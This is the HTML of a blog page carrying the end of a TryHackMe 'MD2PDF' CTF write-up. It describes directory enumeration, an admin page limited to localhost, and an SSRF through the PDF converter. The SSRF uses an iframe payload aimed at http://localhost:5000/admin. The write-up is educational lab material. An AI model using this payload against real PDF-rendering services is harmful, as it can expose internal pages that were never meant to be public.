type="image/webp"><source data-testid="og" srcset="https://miro.medium.com/v2/resize:fit:640/1*JDVQMlBq1k3ewvfT_lJG-A.png 640w, https://miro.medium.com/v2/resize:fit:720/1*JDVQMlBq1k3ewvfT_lJG-A.png 720w, https://miro.medium.com/v2/resize:fit:750/1*JDVQMlBq1k3ewvfT_lJG-A.png 750w, https://miro.medium.com/v2/resize:fit:786/1*JDVQMlBq1k3ewvfT_lJG-A.png 786w, https://miro.medium.com/v2/resize:fit:828/1*JDVQMlBq1k3ewvfT_lJG-A.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*JDVQMlBq1k3ewvfT_lJG-A.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*JDVQMlBq1k3ewvfT_lJG-A.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"><img src="https://miro.medium.com/v2/resize:fit:700/1*JDVQMlBq1k3ewvfT_lJG-A.png" alt="TryHackMe MD2PDF writeup" width="700" height="297" loading="lazy" data-is-external-image="true"></figure></div></div></figure><figure class="yq yr ys yt yu yv kl km paragraph-image"><div class="acf acg dj ach bg aci" tabindex="0" role="button"><div class="kl km anp"><figure class="bg yx yy c"><source srcset="https://miro.medium.com/v2/resize:fit:640/format:webp/1*VbRCo9BCm9S0zhRJLi9_iQ.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*VbRCo9BCm9S0zhRJLi9_iQ.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*VbRCo9BCm9S0zhRJLi9_iQ.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*VbRCo9BCm9S0zhRJLi9_iQ.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*VbRCo9BCm9S0zhRJLi9_iQ.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*VbRCo9BCm9S0zhRJLi9_iQ.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*VbRCo9BCm9S0zhRJLi9_iQ.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"><source data-testid="og" srcset="https://miro.medium.com/v2/resize:fit:640/1*VbRCo9BCm9S0zhRJLi9_iQ.png 640w, https://miro.medium.com/v2/resize:fit:720/1*VbRCo9BCm9S0zhRJLi9_iQ.png 720w, https://miro.medium.com/v2/resize:fit:750/1*VbRCo9BCm9S0zhRJLi9_iQ.png 750w, https://miro.medium.com/v2/resize:fit:786/1*VbRCo9BCm9S0zhRJLi9_iQ.png 786w, https://miro.medium.com/v2/resize:fit:828/1*VbRCo9BCm9S0zhRJLi9_iQ.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*VbRCo9BCm9S0zhRJLi9_iQ.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*VbRCo9BCm9S0zhRJLi9_iQ.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"><img src="https://miro.medium.com/v2/resize:fit:700/1*VbRCo9BCm9S0zhRJLi9_iQ.png" alt="TryHackMe MD2PDF writeup" width="700" height="240" loading="lazy" data-is-external-image="true"></figure></div></div></figure><p id="735a" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">Now weâ€™ll run gobuster to find if thereâ€™s any interesting thing or directory.</p><figure class="yq yr ys yt yu yv kl km paragraph-image"><div class="acf acg dj ach bg aci" tabindex="0" role="button"><div class="kl km aoa"><figure class="bg yx yy c"><source srcset="https://miro.medium.com/v2/resize:fit:640/format:webp/1*0QGwpf2XoO_4PW4xVjPrSw.jpeg 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*0QGwpf2XoO_4PW4xVjPrSw.jpeg 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*0QGwpf2XoO_4PW4xVjPrSw.jpeg 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*0QGwpf2XoO_4PW4xVjPrSw.jpeg 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*0QGwpf2XoO_4PW4xVjPrSw.jpeg 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*0QGwpf2XoO_4PW4xVjPrSw.jpeg 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*0QGwpf2XoO_4PW4xVjPrSw.jpeg 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"><source data-testid="og" srcset="https://miro.medium.com/v2/resize:fit:640/1*0QGwpf2XoO_4PW4xVjPrSw.jpeg 640w, https://miro.medium.com/v2/resize:fit:720/1*0QGwpf2XoO_4PW4xVjPrSw.jpeg 720w, https://miro.medium.com/v2/resize:fit:750/1*0QGwpf2XoO_4PW4xVjPrSw.jpeg 750w, https://miro.medium.com/v2/resize:fit:786/1*0QGwpf2XoO_4PW4xVjPrSw.jpeg 786w, https://miro.medium.com/v2/resize:fit:828/1*0QGwpf2XoO_4PW4xVjPrSw.jpeg 828w, https://miro.medium.com/v2/resize:fit:1100/1*0QGwpf2XoO_4PW4xVjPrSw.jpeg 1100w, https://miro.medium.com/v2/resize:fit:1400/1*0QGwpf2XoO_4PW4xVjPrSw.jpeg 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"><img src="https://miro.medium.com/v2/resize:fit:700/1*0QGwpf2XoO_4PW4xVjPrSw.jpeg" alt="TryHackMe MD2PDF writeup" width="700" height="367" loading="lazy" data-is-external-image="true"></figure></div></div></figure><p id="c0ef" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">We got an admin directory which when accessed gives 403.</p><figure class="yq yr ys yt yu yv kl km paragraph-image"><div class="acf acg dj ach bg aci" tabindex="0" role="button"><div class="kl km anp"><figure class="bg yx yy c"><source srcset="https://miro.medium.com/v2/resize:fit:640/format:webp/1*U355yK93I5_hRbSQKVIwFw.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*U355yK93I5_hRbSQKVIwFw.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*U355yK93I5_hRbSQKVIwFw.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*U355yK93I5_hRbSQKVIwFw.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*U355yK93I5_hRbSQKVIwFw.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*U355yK93I5_hRbSQKVIwFw.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*U355yK93I5_hRbSQKVIwFw.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"><source data-testid="og" srcset="https://miro.medium.com/v2/resize:fit:640/1*U355yK93I5_hRbSQKVIwFw.png 640w, https://miro.medium.com/v2/resize:fit:720/1*U355yK93I5_hRbSQKVIwFw.png 720w, https://miro.medium.com/v2/resize:fit:750/1*U355yK93I5_hRbSQKVIwFw.png 750w, https://miro.medium.com/v2/resize:fit:786/1*U355yK93I5_hRbSQKVIwFw.png 786w, https://miro.medium.com/v2/resize:fit:828/1*U355yK93I5_hRbSQKVIwFw.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*U355yK93I5_hRbSQKVIwFw.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*U355yK93I5_hRbSQKVIwFw.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"><img src="https://miro.medium.com/v2/resize:fit:700/1*U355yK93I5_hRbSQKVIwFw.png" alt="TryHackMe MD2PDF writeup" width="700" height="293" loading="lazy" data-is-external-image="true"></figure></div></div></figure><p id="44aa" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">But we got an interesting massage thatÂ <strong class="ly kz">it only be seen internally (localhost:5000).</strong></p><p id="31e9" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">Now we can use it as leverage the SSRF vulnerability and view the admin directory on port 5000.</p><figure class="yq yr ys yt yu yv kl km paragraph-image"><div class="acf acg dj ach bg aci" tabindex="0" role="button"><div class="kl km anp"><figure class="bg yx yy c"><source srcset="https://miro.medium.com/v2/resize:fit:640/format:webp/1*wjFmdtFBiB6hNEQjeYbJ1Q.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*wjFmdtFBiB6hNEQjeYbJ1Q.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*wjFmdtFBiB6hNEQjeYbJ1Q.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*wjFmdtFBiB6hNEQjeYbJ1Q.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*wjFmdtFBiB6hNEQjeYbJ1Q.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*wjFmdtFBiB6hNEQjeYbJ1Q.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*wjFmdtFBiB6hNEQjeYbJ1Q.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"><source data-testid="og" srcset="https://miro.medium.com/v2/resize:fit:640/1*wjFmdtFBiB6hNEQjeYbJ1Q.png 640w, https://miro.medium.com/v2/resize:fit:720/1*wjFmdtFBiB6hNEQjeYbJ1Q.png 720w, https://miro.medium.com/v2/resize:fit:750/1*wjFmdtFBiB6hNEQjeYbJ1Q.png 750w, https://miro.medium.com/v2/resize:fit:786/1*wjFmdtFBiB6hNEQjeYbJ1Q.png 786w, https://miro.medium.com/v2/resize:fit:828/1*wjFmdtFBiB6hNEQjeYbJ1Q.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*wjFmdtFBiB6hNEQjeYbJ1Q.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*wjFmdtFBiB6hNEQjeYbJ1Q.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"><img src="https://miro.medium.com/v2/resize:fit:700/1*wjFmdtFBiB6hNEQjeYbJ1Q.png" alt="TryHackMe MD2PDF writeup" width="700" height="364" loading="lazy" data-is-external-image="true"></figure></div></div></figure><p id="05d0" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">Copy this payload &amp; paste it. Then tap on the â€˜Convert to PDFâ€™ button.</p><pre class="yq yr ys yt yu abx abp anr bo ans ba bj"><span id="ff25" class="ant zf tu abp b bf anu anv l anw acd" data-selectable-paragraph=""><span class="hljs-title.class">Payload</span>: &lt;iframe src="http://localhost:5000/admin" width="1000" height="2000"&gt;</span></pre><figure class="yq yr ys yt yu yv kl km paragraph-image"><div class="acf acg dj ach bg aci" tabindex="0" role="button"><div class="kl km anp"><figure class="bg yx yy c"><source srcset="https://miro.medium.com/v2/resize:fit:640/format:webp/1*WYsDb15y6dEfAQeiOrb11g.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*WYsDb15y6dEfAQeiOrb11g.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*WYsDb15y6dEfAQeiOrb11g.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*WYsDb15y6dEfAQeiOrb11g.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*WYsDb15y6dEfAQeiOrb11g.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*WYsDb15y6dEfAQeiOrb11g.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*WYsDb15y6dEfAQeiOrb11g.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"><source data-testid="og" srcset="https://miro.medium.com/v2/resize:fit:640/1*WYsDb15y6dEfAQeiOrb11g.png 640w, https://miro.medium.com/v2/resize:fit:720/1*WYsDb15y6dEfAQeiOrb11g.png 720w, https://miro.medium.com/v2/resize:fit:750/1*WYsDb15y6dEfAQeiOrb11g.png 750w, https://miro.medium.com/v2/resize:fit:786/1*WYsDb15y6dEfAQeiOrb11g.png 786w, https://miro.medium.com/v2/resize:fit:828/1*WYsDb15y6dEfAQeiOrb11g.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*WYsDb15y6dEfAQeiOrb11g.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*WYsDb15y6dEfAQeiOrb11g.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"><img src="https://miro.medium.com/v2/resize:fit:700/1*WYsDb15y6dEfAQeiOrb11g.png" alt="TryHackMe MD2PDF writeup &amp; solve &amp; flag." width="700" height="270" loading="lazy" data-is-external-image="true"></figure></div></div></figure><p id="4131" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">Bangâ€¦â€¦! We got our flag!!!!</p><figure class="yq yr ys yt yu yv kl km paragraph-image"><a href="https://www.buymeacoffee.com/sakibulalikhan"></a></figure></div><footer><p class="post__last-updated">This article was updated on August 19, 2023</p><div class="post__tags-share"><ul class="post__tag"><li><a href="https://sakibulalikhan.pages.dev/tags/ctf-writeup/">CTF Writeups</a></li><li><a href="https://sakibulalikhan.pages.dev/tags/tryhackme/">Tryhackme</a></li><li><a href="https://sakibulalikhan.pages.dev/tags/web-security/">Web Security</a></li></ul><aside class="post__share"><a href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fsakibulalikhan.pages.dev%2Ftryhackme-or-md2pdf-or-ctf-writeup.html" class="js-share facebook" aria-label="Share with Facebook" rel="nofollow noopener noreferrer"><svg><use xlink:href="https://sakibulalikhan.pages.dev/assets/svg/svg-map.svg#facebook"/></svg> </a><a href="https://twitter.com/share?url=https%3A%2F%2Fsakibulalikhan.pages.dev%2Ftryhackme-or-md2pdf-or-ctf-writeup.html&amp;via=%40sakibulalikhan&amp;text=TryHackMe%20%7C%20MD2PDF%20%7C%20CTF%20Writeup" class="js-share twitter" aria-label="Share with Twitter" rel="nofollow noopener noreferrer"><svg><use xlink:href="https://sakibulalikhan.pages.dev/assets/svg/svg-map.svg#twitter"/></svg> </a><a href="https://pinterest.com/pin/create/button/?url=https%3A%2F%2Fsakibulalikhan.pages.dev%2Ftryhackme-or-md2pdf-or-ctf-writeup.html&amp;media=https%3A%2F%2Fsakibulalikhan.pages.dev%2Fmedia%2Fposts%2F4%2FMD2PDF.jpg&amp;description=TryHackMe%20%7C%20MD2PDF%20%7C%20CTF%20Writeup" class="js-share pinterest" aria-label="Share with Pinterest" rel="nofollow noopener noreferrer"><svg><use xlink:href="https://sakibulalikhan.pages.dev/assets/svg/svg-map.svg#pinterest"/></svg> </a><a href="https://mix.com/add?url=https%3A%2F%2Fsakibulalikhan.pages.dev%2Ftryhackme-or-md2pdf-or-ctf-writeup.html" class="js-share mix" aria-label="Share with Mix" rel="nofollow noopener noreferrer"><svg><use xlink:href="https://sakibulalikhan.pages.dev/assets/svg/svg-map.svg#mix"/></svg> </a><a href="https://www.linkedin.com/sharing/share-offsite/?url=https%3A%2F%2Fsakibulalikhan.pages.dev%2Ftryhackme-or-md2pdf-or-ctf-writeup.html" class="js-share linkedin" aria-label="Share with LinkedIn" rel="nofollow noopener noreferrer"><svg><use xlink:href="https://sakibulalikhan.pages.dev/assets/svg/svg-map.svg#linkedin"/></svg> </a><a href="https://buffer.com/add?text=TryHackMe%20%7C%20MD2PDF%20%7C%20CTF%20Writeup&amp;url=https%3A%2F%2Fsakibulalikhan.pages.dev%2Ftryhackme-or-md2pdf-or-ctf-writeup.html" class="js-share buffer" aria-label="Share with Buffer" rel="nofollow noopener noreferrer"><svg><use xlink:href="https://sakibulalikhan.pages.dev/assets/svg/svg-map.svg#buffer"/></svg> </a><a href="https://api.whatsapp.com/send?text=TryHackMe%20%7C%20MD2PDF%20%7C%20CTF%20Writeup https%3A%2F%2Fsakibulalikhan.pages.dev%2Ftryhackme-or-md2pdf-or-ctf-writeup.html" class="js-share whatsapp" aria-label="Share with WhatsApp" rel="nofollow noopener noreferrer"><svg class="icon" aria-hidden="true" focusable="false"><use xlink:href="https://sakibulalikhan.pages.dev/assets/svg/svg-map.svg#whatsapp"/></svg></a></aside></div><div class="post__bio bio"><img src="https://sakibulalikhan.pages.dev/media/website/avatar.jpg" loading="lazy" height="431" width="343" class="bio__avatar" alt="Sakibul Ali Khan"><div><h3 class="h6 bio__name"><a href="https://sakibulalikhan.pages.dev/authors/sakibulalikhan/" class="invert" title="Sakibul Ali Khan">Sakibul Ali Khan</a></h3><div class="bio__desc"><p>Currently Iâ€™m a student and I love computers. I love programming and playing with technology. I am highly interested in cyber security.</p></div></div></div><nav class="post__nav"><div class="post__nav__prev"><a class="post__nav__link" href="https://sakibulalikhan.pages.dev/how-to-limit-battery-charging-set-a-charge-threshold-for-asus-laptops-on-linux.html" rel="prev">Previous Post<h3 class="h6">How To Limit Battery Charging (Set A Charge Threshold) For ASUS Laptops On Linux</h3></a></div><div class="post__nav__next"><a class="post__nav__link" href="https://sakibulalikhan.pages.dev/bugged-tryhackme-ctf-writeup.html" rel="prev">Next Post<h3 class="h6">Bugged Tryhackme CTF Writeup</h3></a></div></nav></footer></div></article><div class="comments-area post__inner" id="comments"><div class="comments"><div class="comments-wrapper"><h2>Comments</h2><div id="disqus_thread"></div><noscript>Please enable JS to use the comments form.</noscript><script type="text/javascript">var disqus_config = function () {
							this.page.url = 'https://sakibulalikhan.pages.dev/tryhackme-or-md2pdf-or-ctf-writeup.html';
							this.page.identifier = '4'; 
							this.language = 'en_GB';
						};
						
						
				var disqus_element_to_check = document.getElementById('disqus_thread');

				if ('IntersectionObserver' in window) {
					var iObserver = new IntersectionObserver(
						(entries, observer) => {
							entries.forEach(entry => {
								if (entry.intersectionRatio >= 0.1) {
									(function () {
										var d = document, s = d.createElement('script');
										s.src = 'https://'+('sakibulalikhan-github-io').trim()+'.disqus.com/embed.js';
										s.setAttribute('data-timestamp', +new Date());
										(d.head || d.body).appendChild(s);
									})();
									observer.unobserve(entry.target);
								}
							});
						},
						{
							threshold: [0, 0.2, 0.5, 1]
						}
					);

					iObserver.observe(disqus_element_to_check);
				} else {
					(function () {
						var d = document, s = d.createElement('script');
						s.src = 'https://'+('sakibulalikhan-github-io').trim()+'.disqus.com/embed.js';
						s.setAttribute('data-timestamp', +new Date());
						(d.head || d.body).appendChild(s);
					})();
				}</script><script type="text/javascript"></script></div></div></div></div><div class="post__related"><div class="wrapper"><h2 class="h5">Related posts</h2><div class="l-grid l-grid--4"><article class="c-card"><a href="https://sakibulalikhan.pages.dev/phonebook-htb-web-challenge-writeup.html" class="c-card__image"><img src="https://sakibulalikhan.pages.dev/media/posts/8/phonebook.jpg" srcset="https://sakibulalikhan.pages.dev/media/posts/8/responsive/phonebook-xs.jpg 300w, https://sakibulalikhan.pages.dev/media/posts/8/responsive/phonebook-sm.jpg 480w, https://sakibulalikhan.pages.dev/media/posts/8/responsive/phonebook-md.jpg 768w, https://sakibulalikhan.pages.dev/media/posts/8/responsive/phonebook-lg.jpg 1200w" sizes="(min-width: 56.25em) 100vw, (min-width: 37.5em) 50vw, 100vw" loading="lazy" height="657" width="720" alt="Phonebook â€” HTB Web Challenge Writeup"></a><div class="c-card__wrapper"><header class="c-card__header"><div class="c-card__tag"><a href="https://sakibulalikhan.pages.dev/tags/hackthebox/">HackTheBox</a></div><h3 class="c-card__title"><a href="https://sakibulalikhan.pages.dev/phonebook-htb-web-challenge-writeup.html" class="invert">Phonebook â€” HTB Web Challenge Writeup</a></h3></header><footer class="c-card__meta"><time datetime="2023-08-19T02:19">August 19, 2023</time><div class="c-card__comments"><a href="https://sakibulalikhan.pages.dev/phonebook-htb-web-challenge-writeup.html#comments" rel="nofollow" aria-label="Comments"><svg aria-hidden="true"><title>Comments</title><use xlink:href="https://sakibulalikhan.pages.dev/assets/svg/svg-map.svg#comments"/></svg></a></div></footer></div></article><article class="c-card"><a href="https://sakibulalikhan.pages.dev/templated-htb-web-challenge-writeup.html" class="c-card__image"><img src="https://sakibulalikhan.pages.dev/media/posts/7/Templated.jpg" srcset="https://sakibulalikhan.pages.dev/media/posts/7/responsive/Templated-xs.jpg 300w, https://sakibulalikhan.pages.dev/media/posts/7/responsive/Templated-sm.jpg 480w, https://sakibulalikhan.pages.dev/media/posts/7/responsive/Templated-md.jpg 768w, https://sakibulalikhan.pages.dev/media/posts/7/responsive/Templated-lg.jpg 1200w" sizes="(min-width: 56.25em) 100vw, (min-width: 37.5em) 50vw, 100vw" loading="lazy" height="308" width="720" alt="Templated â€” HTB Web Challenge Writeup"></a><div class="c-card__wrapper"><header class="c-card__header"><div class="c-card__tag"><a href="https://sakibulalikhan.pages.dev/tags/hackthebox/">HackTheBox</a></div><h3 class="c-card__title"><a href="https://sakibulalikhan.pages.dev/templated-htb-web-challenge-writeup.html" class="invert">Templated â€” HTB Web Challenge Writeup</a></h3></header><footer class="c-card__meta"><time datetime="2023-08-19T02:18">August 19, 2023</time><div class="c-card__comments"><a href="https://sakibulalikhan.pages.dev/templated-htb-web-challenge-writeup.html#comments" rel="nofollow" aria-label="Comments"><svg aria-hidden="true"><title>Comments</title><use xlink:href="https://sakibulalikhan.pages.dev/assets/svg/svg-map.svg#comments"/></svg></a></div></footer></div></article><article class="c-card"><a href="https://sakibulalikhan.pages.dev/takeover-tryhackme-writeup.html" class="c-card__image"><img src="https://sakibulalikhan.pages.dev/media/posts/6/TakeOver.jpg" srcset="https://sakibulalikhan.pages.dev/media/posts/6/responsive/TakeOver-xs.jpg 300w, https://sakibulalikhan.pages.dev/media/posts/6/responsive/TakeOver-sm.jpg 480w, https://sakibulalikhan.pages.dev/media/posts/6/responsive/TakeOver-md.jpg 768w, https://sakibulalikhan.pages.dev/media/posts/6/responsive/TakeOver-lg.jpg 1200w" sizes="(min-width: 56.25em) 100vw, (min-width: 37.5em) 50vw, 100vw" loading="lazy" height="512" width="512" alt="TakeOver TryHackMe Writeup"></a><div class="c-card__wrapper"><header class="c-card__header"><div class="c-card__tag"><a href="https://sakibulalikhan.pages.dev/tags/tryhackme/">Tryhackme</a></div><h3 class="c-card__title"><a href="https://sakibulalikhan.pages.dev/takeover-tryhackme-writeup.html" class="invert">TakeOver TryHackMe Writeup</a></h3></header><footer class="c-card__meta"><time datetime="2023-08-19T02:17">August 19, 2023</time><div class="c-card__comments"><a href="https://sakibulalikhan.pages.dev/takeover-tryhackme-writeup.html#comments" rel="nofollow" aria-label="Comments"><svg aria-hidden="true"><title>Comments</title><use xlink:href="https://sakibulalikhan.pages.dev/assets/svg/svg-map.svg#comments"/></svg></a></div></footer></div></article><article class="c-card"><a href="https://sakibulalikhan.pages.dev/bugged-tryhackme-ctf-writeup.html" class="c-card__image"><img src="https://sakibulalikhan.pages.dev/media/posts/5/Bugged.jpg" srcset="https://sakibulalikhan.pages.dev/media/posts/5/responsive/Bugged-xs.jpg 300w, https://sakibulalikhan.pages.dev/media/posts/5/responsive/Bugged-sm.jpg 480w, https://sakibulalikhan.pages.dev/media/posts/5/responsive/Bugged-md.jpg 768w, https://sakibulalikhan.pages.dev/media/posts/5/responsive/Bugged-lg.jpg 1200w" sizes="(min-width: 56.25em) 100vw, (min-width: 37.5em) 50vw, 100vw" loading="lazy" height="256" width="256" alt="Bugged Tryhackme CTF Writeup"></a><div class="c-card__wrapper"><header class="c-card__header"><div class="c-card__tag"><a href="https://sakibulalikhan.pages.dev/tags/tryhackme/">Tryhackme</a></div><h3 class="c-card__title"><a href="https://sakibulalikhan.pages.dev/bugged-tryhackme-ctf-writeup.html" class="invert">Bugged Tryhackme CTF Writeup</a></h3></header><footer class="c-card__meta"><time datetime="2023-08-19T02:15">August 19, 2023</time><div class="c-card__comments"><a href="https://sakibulalikhan.pages.dev/bugged-tryhackme-ctf-writeup.html#comments" rel="nofollow" aria-label="Comments"><svg aria-hidden="true"><title>Comments</title><use xlink:href="https://sakibulalikhan.pages.dev/assets/svg/svg-map.svg#comments"/></svg></a></div></footer></div></article></div></div></div></main><footer class="footer"><div class="footer__social"><a href="https://twitter.com/sakibulalikhan" aria-label="Twitter" class="twitter"><svg><use xlink:href="https://sakibulalikhan.pages.dev/assets/svg/svg-map.svg#twitter"/></svg> </a><a href="https://github.com/sakibulalikhan" aria-label="Instagram" class="instagram"><svg><use xlink:href="https://sakibulalikhan.pages.dev/assets/svg/svg-map.svg#instagram"/></svg> </a><a 